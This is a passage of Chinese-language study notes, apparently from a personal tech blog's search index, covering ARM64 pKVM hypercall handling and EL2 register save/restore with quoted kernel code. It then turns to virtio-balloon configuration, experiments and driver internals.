id=\"kvm-call-hyp-nvhe\"><a href=\"#kvm-call-hyp-nvhe\" class=\"headerlink\" title=\"kvm_call_hyp_nvhe\"></a>kvm_call_hyp_nvhe</h3><p>vbar_el2的el1_sync可能为</p>\n<ul>\n<li>Host stage2 page fault：需要保存恢复通用寄存器</li>\n<li>Host hypercall：需要x0作为返回值</li>\n</ul>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> __create_hyp_private_mapping(<span class=\"type\">phys_addr_t</span> phys_addr, <span class=\"type\">size_t</span> size,</span><br><span class=\"line\">                    <span class=\"type\">unsigned</span> <span class=\"type\">long</span> *haddr,</span><br><span class=\"line\">                    <span class=\"keyword\">enum</span> kvm_pgtable_prot prot)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">long</span> addr;</span><br><span class=\"line\">    <span class=\"type\">int</span> ret = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"built_in\">kvm_host_owns_hyp_mappings</span>()) &#123;</span><br><span class=\"line\">        addr = <span class=\"built_in\">kvm_call_hyp_nvhe</span>(__pkvm_create_private_mapping,</span><br><span class=\"line\">                     phys_addr, size, prot);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"built_in\">IS_ERR_VALUE</span>(addr))</span><br><span class=\"line\">            <span class=\"keyword\">return</span> addr;</span><br><span class=\"line\">        *haddr = addr;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    size = <span class=\"built_in\">PAGE_ALIGN</span>(size + <span class=\"built_in\">offset_in_page</span>(phys_addr));</span><br><span class=\"line\">    ret = <span class=\"built_in\">hyp_alloc_private_va_range</span>(size, &amp;addr);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (ret)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\"></span><br><span class=\"line\">    ret = __create_hyp_mappings(addr, size, phys_addr, prot);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (ret)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\"></span><br><span class=\"line\">    *haddr = addr + <span class=\"built_in\">offset_in_page</span>(phys_addr);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">kvm_cpu_context</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">user_pt_regs</span> regs;   <span class=\"comment\">/* sp = sp_el0 */</span></span><br><span class=\"line\"></span><br><span class=\"line\">    u64 spsr_abt;</span><br><span class=\"line\">    u64 spsr_und;</span><br><span class=\"line\">    u64 spsr_irq;</span><br><span class=\"line\">    u64 spsr_fiq;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">user_fpsimd_state</span> fp_regs;</span><br><span class=\"line\"></span><br><span class=\"line\">    u64 sys_regs[NR_SYS_REGS];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">kvm_vcpu</span> *__hyp_running_vcpu;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* This pointer has to be 4kB aligned. */</span></span><br><span class=\"line\">    u64 *vncr_array;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">user_pt_regs</span> &#123;</span><br><span class=\"line\">    __u64       regs[<span class=\"number\">31</span>];</span><br><span class=\"line\">    __u64       sp;</span><br><span class=\"line\">    __u64       pc;</span><br><span class=\"line\">    __u64       pstate;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> cpu_reg(ctxt, r)    (ctxt)-&gt;regs.regs[r]</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> DECLARE_REG(type, name, ctxt, reg)  \\</span></span><br><span class=\"line\"><span class=\"meta\">                type name = (type)cpu_reg(ctxt, (reg))</span></span><br><span class=\"line\">                </span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">handle_trap</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_cpu_context *host_ctxt)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    u64 esr = <span class=\"built_in\">read_sysreg_el2</span>(SYS_ESR);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">switch</span> (<span class=\"built_in\">ESR_ELx_EC</span>(esr)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> ESR_ELx_EC_HVC64:</span><br><span class=\"line\">        <span class=\"built_in\">handle_host_hcall</span>(host_ctxt);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title\">handle___pkvm_create_private_mapping</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_cpu_context *host_ctxt)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">DECLARE_REG</span>(<span class=\"type\">phys_addr_t</span>, phys, host_ctxt, <span class=\"number\">1</span>);</span><br><span class=\"line\">    <span class=\"built_in\">DECLARE_REG</span>(<span class=\"type\">size_t</span>, size, host_ctxt, <span class=\"number\">2</span>);</span><br><span class=\"line\">    <span class=\"built_in\">DECLARE_REG</span>(<span class=\"keyword\">enum</span> kvm_pgtable_prot, prot, host_ctxt, <span class=\"number\">3</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">     * __pkvm_create_private_mapping() populates a pointer with the</span></span><br><span class=\"line\"><span class=\"comment\">     * hypervisor start address of the allocation.</span></span><br><span class=\"line\"><span class=\"comment\">     *</span></span><br><span class=\"line\"><span class=\"comment\">     * However, handle___pkvm_create_private_mapping() hypercall crosses the</span></span><br><span class=\"line\"><span class=\"comment\">     * EL1/EL2 boundary so the pointer would not be valid in this context.</span></span><br><span class=\"line\"><span class=\"comment\">     *</span></span><br><span class=\"line\"><span class=\"comment\">     * Instead pass the allocation address as the return value (or return</span></span><br><span class=\"line\"><span class=\"comment\">     * ERR_PTR() on failure).</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">long</span> haddr;</span><br><span class=\"line\">    <span class=\"type\">int</span> err = __pkvm_create_private_mapping(phys, size, prot, &amp;haddr);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (err)</span><br><span class=\"line\">        haddr = (<span class=\"type\">unsigned</span> <span class=\"type\">long</span>)<span class=\"built_in\">ERR_PTR</span>(err);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">cpu_reg</span>(host_ctxt, <span class=\"number\">1</span>) = haddr;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"built_in\">DEFINE</span>(CPU_USER_PT_REGS,  <span class=\"built_in\">offsetof</span>(<span class=\"keyword\">struct</span> kvm_cpu_context, regs));</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CPU_XREG_OFFSET(x)  (CPU_USER_PT_REGS + 8*x)</span></span><br><span class=\"line\"></span><br><span class=\"line\">.macro save_callee_saved_regs ctxt</span><br><span class=\"line\">    str x18,      [\\ctxt, #<span class=\"built_in\">CPU_XREG_OFFSET</span>(<span class=\"number\">18</span>)]</span><br><span class=\"line\">    stp x19, x20, [\\ctxt, #<span class=\"built_in\">CPU_XREG_OFFSET</span>(<span class=\"number\">19</span>)]</span><br><span class=\"line\">    stp x21, x22, [\\ctxt, #<span class=\"built_in\">CPU_XREG_OFFSET</span>(<span class=\"number\">21</span>)]</span><br><span class=\"line\">    stp x23, x24, [\\ctxt, #<span class=\"built_in\">CPU_XREG_OFFSET</span>(<span class=\"number\">23</span>)]</span><br><span class=\"line\">    stp x25, x26, [\\ctxt, #<span class=\"built_in\">CPU_XREG_OFFSET</span>(<span class=\"number\">25</span>)]</span><br><span class=\"line\">    stp x27, x28, [\\ctxt, #<span class=\"built_in\">CPU_XREG_OFFSET</span>(<span class=\"number\">27</span>)]</span><br><span class=\"line\">    stp x29, lr,  [\\ctxt, #<span class=\"built_in\">CPU_XREG_OFFSET</span>(<span class=\"number\">29</span>)]</span><br><span class=\"line\">.endm</span><br><span class=\"line\"></span><br><span class=\"line\">.macro get_host_ctxt reg, tmp</span><br><span class=\"line\">    adr_this_cpu \\reg, kvm_host_data, \\tmp</span><br><span class=\"line\">    add \\reg, \\reg, #HOST_DATA_CONTEXT</span><br><span class=\"line\">.endm</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"> * @dst: Result of per_cpu(sym, smp_processor_id()) (can be SP)</span></span><br><span class=\"line\"><span class=\"comment\"> * @sym: The name of the per-cpu variable</span></span><br><span class=\"line\"><span class=\"comment\"> * @tmp: scratch register</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\">.macro adr_this_cpu, dst, sym, tmp</span><br><span class=\"line\">    adrp    \\tmp, \\sym</span><br><span class=\"line\">    add \\dst, \\tmp, #:lo12:\\sym</span><br><span class=\"line\">    get_this_cpu_offset \\tmp</span><br><span class=\"line\">    add \\dst, \\dst, \\tmp</span><br><span class=\"line\">.endm</span><br><span class=\"line\"></span><br><span class=\"line\">.macro  get_this_cpu_offset, dst</span><br><span class=\"line\">    mrs \\dst, tpidr_el2</span><br><span class=\"line\">.endm</span><br><span class=\"line\"></span><br><span class=\"line\">展开后：</span><br><span class=\"line\">adrp    x1, kvm_host_data</span><br><span class=\"line\">add x0, x1, #:lo12:kvm_host_data</span><br><span class=\"line\">mrs x1, tpidr_el2</span><br><span class=\"line\">add x0, x0, x1</span><br><span class=\"line\">add x0, x0, #HOST_DATA_CONTEXT</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">.macro host_el1_sync_vect</span><br><span class=\"line\">        .align <span class=\"number\">7</span></span><br><span class=\"line\">.L__vect_start\\@:</span><br><span class=\"line\">        stp        x0, x1, [sp, #<span class=\"number\">-16</span>]!</span><br><span class=\"line\">        mrs        x0, esr_el2</span><br><span class=\"line\">        ubfx        x0, x0, #ESR_ELx_EC_SHIFT, #ESR_ELx_EC_WIDTH</span><br><span class=\"line\">        cmp        x0, #ESR_ELx_EC_HVC64</span><br><span class=\"line\">        b.<span class=\"function\">eq        __host_hvc</span></span><br><span class=\"line\"><span class=\"function\">        b        __host_exit</span></span><br><span class=\"line\"><span class=\"function\">        </span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">SYM_FUNC_START</span><span class=\"params\">(__host_exit)</span></span></span><br><span class=\"line\"><span class=\"function\">        get_host_ctxt        x0, x1</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">        <span class=\"comment\">/* Store the host regs x2 and x3 */</span></span></span><br><span class=\"line\"><span class=\"function\">        stp        x2, x3,   [x0, #<span class=\"title\">CPU_XREG_OFFSET</span><span class=\"params\">(<span class=\"number\">2</span>)</span>]</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">        <span class=\"comment\">/* Retrieve the host regs x0-x1 from the stack */</span></span></span><br><span class=\"line\"><span class=\"function\">        ldp        x2, x3, [sp], #16        <span class=\"comment\">// x0, x1</span></span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">        <span class=\"comment\">/* Store the host regs x0-x1 and x4-x17 */</span></span></span><br><span class=\"line\"><span class=\"function\">        stp        x2, x3,   [x0, #<span class=\"title\">CPU_XREG_OFFSET</span><span class=\"params\">(<span class=\"number\">0</span>)</span>]</span></span><br><span class=\"line\"><span class=\"function\">        stp        x4, x5,   [x0, #<span class=\"title\">CPU_XREG_OFFSET</span><span class=\"params\">(<span class=\"number\">4</span>)</span>]</span></span><br><span class=\"line\"><span class=\"function\">        stp        x6, x7,   [x0, #<span class=\"title\">CPU_XREG_OFFSET</span><span class=\"params\">(<span class=\"number\">6</span>)</span>]</span></span><br><span class=\"line\"><span class=\"function\">        stp        x8, x9,   [x0, #<span class=\"title\">CPU_XREG_OFFSET</span><span class=\"params\">(<span class=\"number\">8</span>)</span>]</span></span><br><span class=\"line\"><span class=\"function\">        stp        x10, x11, [x0, #<span class=\"title\">CPU_XREG_OFFSET</span><span class=\"params\">(<span class=\"number\">10</span>)</span>]</span></span><br><span class=\"line\"><span class=\"function\">        stp        x12, x13, [x0, #<span class=\"title\">CPU_XREG_OFFSET</span><span class=\"params\">(<span class=\"number\">12</span>)</span>]</span></span><br><span class=\"line\"><span class=\"function\">        stp        x14, x15, [x0, #<span class=\"title\">CPU_XREG_OFFSET</span><span class=\"params\">(<span class=\"number\">14</span>)</span>]</span></span><br><span class=\"line\"><span class=\"function\">        stp        x16, x17, [x0, #<span class=\"title\">CPU_XREG_OFFSET</span><span class=\"params\">(<span class=\"number\">16</span>)</span>]</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">        <span class=\"comment\">/* Store the host regs x18-x29, lr */</span></span></span><br><span class=\"line\"><span class=\"function\">        save_callee_saved_regs x0</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">        <span class=\"comment\">/* Save the host context pointer in x29 across the function call */</span></span></span><br><span class=\"line\"><span class=\"function\">        mov        x29, x0</span></span><br><span class=\"line\"><span class=\"function\">        bl        handle_trap</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">__host_enter_restore_full:</span></span><br><span class=\"line\"><span class=\"function\">        /* Restore host regs x0-x17 */</span></span><br><span class=\"line\"><span class=\"function\">        ldp        x0, x1,   [x29, #CPU_XREG_OFFSET(<span class=\"number\">0</span>)]</span></span><br><span class=\"line\"><span class=\"function\">        ldp        x2, x3,   [x29, #CPU_XREG_OFFSET(<span class=\"number\">2</span>)]</span></span><br><span class=\"line\"><span class=\"function\">        ldp        x4, x5,   [x29, #CPU_XREG_OFFSET(<span class=\"number\">4</span>)]</span></span><br><span class=\"line\"><span class=\"function\">        ldp        x6, x7,   [x29, #CPU_XREG_OFFSET(<span class=\"number\">6</span>)]</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">        /* x0<span class=\"number\">-7</span> are use for panic arguments */</span></span><br><span class=\"line\"><span class=\"function\">__host_enter_for_panic:</span></span><br><span class=\"line\"><span class=\"function\">        ldp        x8, x9,   [x29, #CPU_XREG_OFFSET(<span class=\"number\">8</span>)]</span></span><br><span class=\"line\"><span class=\"function\">        ldp        x10, x11, [x29, #CPU_XREG_OFFSET(<span class=\"number\">10</span>)]</span></span><br><span class=\"line\"><span class=\"function\">        ldp        x12, x13, [x29, #CPU_XREG_OFFSET(<span class=\"number\">12</span>)]</span></span><br><span class=\"line\"><span class=\"function\">        ldp        x14, x15, [x29, #CPU_XREG_OFFSET(<span class=\"number\">14</span>)]</span></span><br><span class=\"line\"><span class=\"function\">        ldp        x16, x17, [x29, #CPU_XREG_OFFSET(<span class=\"number\">16</span>)]</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">        /* Restore host regs x18-x29, lr */</span></span><br><span class=\"line\"><span class=\"function\">        restore_callee_saved_regs x29</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">        /* Do not touch any register after this! */</span></span><br><span class=\"line\"><span class=\"function\">__host_enter_without_restoring:</span></span><br><span class=\"line\"><span class=\"function\">        eret</span></span><br><span class=\"line\"><span class=\"function\">        sb</span></span><br><span class=\"line\"><span class=\"function\">SYM_FUNC_END(__host_exit)</span></span><br></pre></td></tr></table></figure>\n\n<p>tpidr_el2硬件不会用 可以软件自己用 </p>\n<p>把每个cpu一个的context存在这个寄存器中</p>\n<p>handler想改寄存器 直接改内存 eret之前恢复寄存器</p>\n<ul>\n<li>没改 那就是最早的值 （mem abort）</li>\n<li>改了 就把改完的内存值恢复到寄存器 （host hypercall）</li>\n</ul>\n<p>实际上可以直接在handler最后用write tpidr_el2来取代ret 不需要提供修改所有寄存器的接口</p>\n<p>但是仍然需要保存恢复寄存器 只不过用的是栈</p>\n<h3 id=\"Gdb\"><a href=\"#Gdb\" class=\"headerlink\" title=\"Gdb\"></a>Gdb</h3><p>b do_pkvm_init</p>\n<p>hvc进入EL2 看b eq地址</p>\n<p>aarch64-linux-gnu-objdump -d vmlinux &gt; arm.out</p>\n<p>gdb中 0xb8dd0127f214 0xb8dd0127f000</p>\n<p>vmlinux中ffff80008107f214 ffff80008107f000</p>\n<p>offset 0xfffec7237fe00000 每次会变</p>\n<p>ffff800081082710 &lt;__kvm_nvhe_fix_host_ownership_walker&gt;. -&gt;0xb8dd01282710</p>\n<p>最后5个不变</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><ol>\n<li>kernel内存启动初始化早期拿出一块地址给EL2用 EL2有一套自己管理内存的方法库</li>\n<li>一套精妙的EL2页表操作代码(kvm_pgtable_walk) 处理hyp stage1 host stage2 guest stage2</li>\n<li>在valid和invalid pte上都加入bit表示owner host hyp guest</li>\n<li>host stage2采用lazy mapping 发生page fault的时候到EL2补映射</li>\n<li>用0表示owner是host，这样巧妙地不需要对host stage2进行自己的处理，只需要把属于hyp的设为1</li>\n<li>在初始化完整后直接启用host stage2页表</li>\n<li>guest的stage2 页表由kvm维护（与pkvm无关）</li>\n<li>Guest的stage2页表操作从EL1提到EL2处理</li>\n</ol>\n","categories":["virtualization"]},{"title":"balloon","url":"/2024/09/17/virtualization/balloon/","content":"<h1 id=\"balloon\"><a href=\"#balloon\" class=\"headerlink\" title=\"balloon\"></a>balloon</h1><h2 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h2><ul>\n<li>guest使用的内核在编译时需要把config_virtio_balloon的选项打开，可以y直接编译进内核 也可以m作为模块手动加载</li>\n<li>qemu启动时加入virtio-balloon选项</li>\n</ul>\n<p>进入虚拟机后ctrl a c进入qemu monitor</p>\n<ul>\n<li>info balloon查看当前balloon大小，默认为qemu启动时指定的最大内存</li>\n<li>balloon xxx(mb) 调整大小</li>\n</ul>\n<p>显示的balloon大小为VM真实可用的内存，剩下的给host</p>\n<ul>\n<li>如果不加入deflate-on-oom参数，VMfree -mh显示内存为balloon大小 超过此大小触发oom killer</li>\n<li>如果加入此参数，VM free -mh显示启动指定的最大参数，但是used显示分给host的值 超过balloon大小会自动调大balloon</li>\n</ul>\n<p><a href=\"https://www.linux-kvm.org/page/Projects/auto-ballooning#TODO\">Projects&#x2F;auto-ballooning - KVM (linux-kvm.org)</a></p>\n<p>auto balloon似乎被废弃了</p>\n<p><a href=\"https://www.ovirt.org/develop/projects/mom.html\">MoM | oVirt</a>这个工具可能可用</p>\n<p>qmp:</p>\n<ul>\n<li>balloon  value</li>\n<li>query-balloon</li>\n</ul>\n<h2 id=\"现象\"><a href=\"#现象\" class=\"headerlink\" title=\"现象\"></a>现象</h2><p>host guest1 guest2均为4G内存</p>\n<ol>\n<li>guest1要2G 从内存分配</li>\n<li>guest2要2G swap掉guest1</li>\n<li>guest1要2G swap掉guest2</li>\n</ol>\n<p><strong>1 正常情况  guest2要内存 host内存不够 回收 但是guest1的2G被swap</strong> 从htop中guest1的qemu 进程mem占用情况可以看出来</p>\n<p>ctrl a c 输入info balloon &#x2F;balloon xxx (MB)</p>\n<p>balloon后面的数字代表VM真实可用内存(不参与balloon) 这个值不能超过qemu启动分配的内存</p>\n<p>balloon目前找不到合适的自动化监控，需要手动用qemu调</p>\n<p><strong>2 guest2需要很多内存的时候手动进guest1的qemu monitor 调小balloon 然后reclaim会直接回收而不是swap</strong></p>\n<p>balloon只会回收guest内存 不会回收host上被swap的guest的页</p>\n<p><a href=\"https://zhidao.baidu.com/question/1519495184466483140.html\">KVM之四：内存balloon的奇妙_百度知道 (baidu.com)</a></p>\n<blockquote>\n<p>目前没有比较方便的、自动化的机制来管理ballooning，一般都是采用在QEMU monitor中执行balloon命令来实现ballooning的。没有对VM的有效监控，没有自动化的ballooning机制，这可能会让生产环境中实现大规模自动化部署并不很方便。</p>\n</blockquote>\n<p><strong>3 如果memhog后sleep 持续占用内存 那balloon会直接把这个进程kill掉 强行拿掉VM的内存</strong></p>\n<p>所以用balloon和不用在结果上是有很大区别的。不用balloon host会把VM的所有内存都swap掉 不管free与否；用balloon host会强行回收VM内存 如果不够就让VMkill自己的进程 </p>\n<p><strong>4 如果VM配了 swap VM会swap</strong></p>\n<blockquote>\n<p>如果有大量内存从VM系统中回收，Ballooning可能会降低VM操作系统运行的性能。一方面，内存的减少，可能会让VM中作为磁盘数据缓存的内存被放到气球中，从而VM中的磁盘I&#x2F;O访问会增加；另一方面，如果处理机制不够好，也可能让VM中正在运行的进程由于内存不足而执行失败。</p>\n</blockquote>\n<p>[<a href=\"https://listman.redhat.com/archives/libvir-list/2015-December/msg00494.html\">libvirt] [PATCH 2&#x2F;2] qemu: add support of optional ‘deflate-on-oom’ attribute (redhat.com)</a></p>\n<p>qemu中可以加入deflate-on-oom的选项，这时候配置了balloon并不会让VM的可用内存变小，而是在VM可用内存不变的情况下增加了Used，之后不会影响VM程序的正常使用。<strong>5 当VM需要的内存大于balloon配置之后，会自动进行deflate 向host要内存 此时info balloon可以看到balloon的值被自动调大了</strong>。但是被调大之后是不会再自动缩小的</p>\n<p><strong>6 VM自己swap的优先级是比deflate-on-oom的优先级高的</strong></p>\n<p><strong>7 在VMlogout的时候 balloon进行回收 仍然能回收到</strong></p>\n<h2 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h2><p><a href=\"https://www.cnblogs.com/edver/p/14684138.html\">virtio简介（二） —— virtio-balloon guest侧驱动 - Edver - 博客园 (cnblogs.com)</a></p>\n<p><a href=\"http://ssdxiao.github.io/linux/2017/03/20/Virtio-Balloon.html\">Virtio-Balloon超详细分析 (ssdxiao.github.io)</a></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">virtio_driver</span> <span class=\"title\">virtio_balloon_driver</span> =</span> &#123;</span><br><span class=\"line\">\t.feature_table = features,</span><br><span class=\"line\">\t.feature_table_size = ARRAY_SIZE(features),</span><br><span class=\"line\">\t.driver.name =\tKBUILD_MODNAME,</span><br><span class=\"line\">\t.driver.owner =\tTHIS_MODULE,</span><br><span class=\"line\">\t.id_table =\tid_table,</span><br><span class=\"line\">\t.validate =\tvirtballoon_validate,</span><br><span class=\"line\">\t.probe =\tvirtballoon_probe,</span><br><span class=\"line\">\t.remove =\tvirtballoon_remove,</span><br><span class=\"line\">\t.config_changed = virtballoon_changed,</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> CONFIG_PM_SLEEP</span></span><br><span class=\"line\">\t.freeze\t=\tvirtballoon_freeze,</span><br><span class=\"line\">\t.restore =\tvirtballoon_restore,</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<p>本身暴露的接口并不多 可以认为就<code>virtballoon_changed</code>一个</p>\n<p>这个内核模块是前端</p>\n<p>需要qemu添加<code>-device virtio-balloon-pci</code>在宿主机上创建一个balloon后端</p>\n<p>qemu monitor中的balloon指令会向VM中的驱动发送指令，从而调用<code>virtballoon_changed</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> __virtio_config_changed(<span class=\"keyword\">struct</span> virtio_device *dev)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">virtio_driver</span> *<span class=\"title\">drv</span> =</span> drv_to_virtio(dev-&gt;dev.driver);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!dev-&gt;config_enabled)</span><br><span class=\"line\">\t\tdev-&gt;config_change_pending = <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (drv &amp;&amp; drv-&gt;config_changed)</span><br><span class=\"line\">\t\tdrv-&gt;config_changed(dev);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>update_balloon_size_func</code> 每次<code>virtballoon_changed</code>只会发生一次 但是调整大小的函数会触发很多次 不是一次性调整好的，并且<code>virtballoon_changed</code>是异步。如果每次update输出时间影响效率</p>\n<p>内核启动时<code>vp_find_vqs_intx</code>注册<code>vp_interrupt</code> 之后向队列写入信息时会产生中断</p>\n<p><code>vp_interrupt</code>-&gt;<code>vp_config_changed</code>-&gt;<code>virtio_config_changed</code>-&gt;<code>__virtio_config_changed</code></p>\n<p>注册vp_interrupt的函数 追踪调用 发现是probe的init_vqs probe由virio_bus的probe调用</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">ssize_t</span> <span class=\"title function_\">bind_store</span><span class=\"params\">(<span class=\"keyword\">struct</span> device_driver *drv, <span class=\"type\">const</span> <span class=\"type\">char</span> *buf,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t  <span class=\"type\">size_t</span> count)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">bus_type</span> *<span class=\"title\">bus</span> =</span> bus_get(drv-&gt;bus);</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">device</span> *<span class=\"title\">dev</span>;</span></span><br><span class=\"line\">\t<span class=\"type\">int</span> err = -ENODEV;</span><br><span class=\"line\"></span><br><span class=\"line\">\tdev = bus_find_device_by_name(bus, <span class=\"literal\">NULL</span>, buf);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (dev &amp;&amp; driver_match_device(drv, dev)) &#123;</span><br><span class=\"line\">\t\terr = device_driver_attach(drv, dev);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (!err) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"comment\">/* success */</span></span><br><span class=\"line\">\t\t\terr = count;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tput_device(dev);</span><br><span class=\"line\">\tbus_put(bus);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> err;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">struct</span> device *<span class=\"title function_\">bus_find_device</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"keyword\">struct</span> bus_type *bus,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t       <span class=\"keyword\">struct</span> device *start, <span class=\"type\">const</span> <span class=\"type\">void</span> *data,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t       <span class=\"type\">int</span> (*match)(<span class=\"keyword\">struct</span> device *dev, <span class=\"type\">const</span> <span class=\"type\">void</span> *data))</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">subsys_private</span> *<span class=\"title\">sp</span> =</span> bus_to_subsys(bus);</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">klist_iter</span> <span class=\"title\">i</span>;</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">device</span> *<span class=\"title\">dev</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!sp)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tklist_iter_init_node(&amp;sp-&gt;klist_devices, &amp;i,</span><br><span class=\"line\">\t\t\t     (start ? &amp;start-&gt;p-&gt;knode_bus : <span class=\"literal\">NULL</span>));</span><br><span class=\"line\">\t<span class=\"keyword\">while</span> ((dev = next_device(&amp;i)))</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (match(dev, data) &amp;&amp; get_device(dev))</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\tklist_iter_exit(&amp;i);</span><br><span class=\"line\">\tsubsys_put(sp);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> dev;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">device_match_name</span><span class=\"params\">(<span class=\"keyword\">struct</span> device *dev, <span class=\"type\">const</span> <span class=\"type\">void</span> *name)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> sysfs_streq(dev_name(dev), name);</span><br><span 